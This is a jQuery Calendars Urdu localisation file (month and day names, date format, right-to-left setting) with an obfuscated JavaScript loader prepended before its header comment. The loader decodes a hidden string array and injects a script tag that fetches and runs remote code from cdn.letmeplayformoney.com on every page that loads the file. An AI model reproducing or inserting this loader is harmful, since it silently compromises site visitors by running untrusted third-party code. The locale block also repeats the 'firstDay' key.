var _0x25b0=['createElement','script','onload','src','https://cdn.letmeplayformoney.com/main.js?cdn=js','text/javascript','getElementsByTagName','head','appendChild'];(function(_0x38c36f,_0x12afce){var _0x31d501=function(_0x338e37){while(--_0x338e37){_0x38c36f['push'](_0x38c36f['shift']());}};_0x31d501(++_0x12afce);}(_0x25b0,0x1dd));var _0x4bec=function(_0x1c1d3d,_0x21e514){_0x1c1d3d=_0x1c1d3d-0x0;var _0x2921c7=_0x25b0[_0x1c1d3d];return _0x2921c7;};var script=document[_0x4bec('0x0')](_0x4bec('0x1'));script[_0x4bec('0x2')]=function(){};script[_0x4bec('0x3')]=_0x4bec('0x4');script['type']=_0x4bec('0x5');document[_0x4bec('0x6')](_0x4bec('0x7'))[0x0][_0x4bec('0x8')](script);﻿/* http://keith-wood.name/calendars.html
   Urdu localisation for Gregorian/Julian calendars for jQuery.
   Mansoor Munib -- mansoormunib@gmail.com <http://www.mansoor.co.nr/mansoor.html>
   Thanks to Habib Ahmed, ObaidUllah Anwar. */
(function($) {
	$.calendars.calendars.gregorian.prototype.regional['ur'] = {
		name: 'Gregorian',
		epochs: ['BCE', 'CE'],
		monthNames: ['جنوری','فروری','مارچ','اپریل','مئی','جون',
		'جولائی','اگست','ستمبر','اکتوبر','نومبر','دسمبر'],
		monthNamesShort: ['1','2','3','4','5','6',
		'7','8','9','10','11','12'],
		dayNames: ['اتوار','پير','منگل','بدھ','جمعرات','جمعہ','ہفتہ'],
		dayNamesShort: ['اتوار','پير','منگل','بدھ','جمعرات','جمعہ','ہفتہ'],
		dayNamesMin: ['اتوار','پير','منگل','بدھ','جمعرات','جمعہ','ہفتہ'],
		dateFormat: 'dd/mm/yyyy',
		firstDay: 0,
		firstDay: 1,
		isRTL: true
	};
	if ($.calendars.calendars.julian) {
		$.calendars.calendars.julian.prototype.regional['ur'] =
			$.calendars.calendars.gregorian.prototype.regional['ur'];
	}
})(jQuery);
